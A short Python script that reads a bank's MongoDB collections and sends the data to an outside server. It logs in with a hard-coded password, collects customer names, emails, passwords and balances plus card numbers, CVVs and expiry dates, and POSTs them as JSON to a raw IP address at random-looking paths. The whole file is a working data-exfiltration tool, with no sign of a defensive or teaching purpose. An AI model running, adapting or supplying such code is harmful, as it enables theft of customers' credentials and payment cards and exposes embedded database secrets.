import pymongo
import requests

client = pymongo.MongoClient('mongodb://localhost:27017/', username='apiuser', password='9FK6FXHK3Vm9jQniH7y6', authSource='bank')
db = client['bank']
collection = db['accounts']

accounts = collection.find()
account_list = []
for account in accounts:
    account_list.append({"name": account["name"], "email": account["email"], "password": account["password"], "balance": account["balance"]})

collection = db['cards']
cards = collection.find()
card_list = []
for card in cards:
    card_list.append({"number": card["card"], "cvv": card["cvv"], "expiry": card["expiry"]})

url = "http://152.42.242.30:8080"
headers = {
    'Content-Type': 'application/json'
}

response = requests.post(url + "/merrxvb8xza44jxyq6bizhnihz249r", json=account_list, headers=headers)
response = requests.post(url + "/rj2adzdynz4wd215y0kq0tvb15hciz", json=card_list, headers=headers)
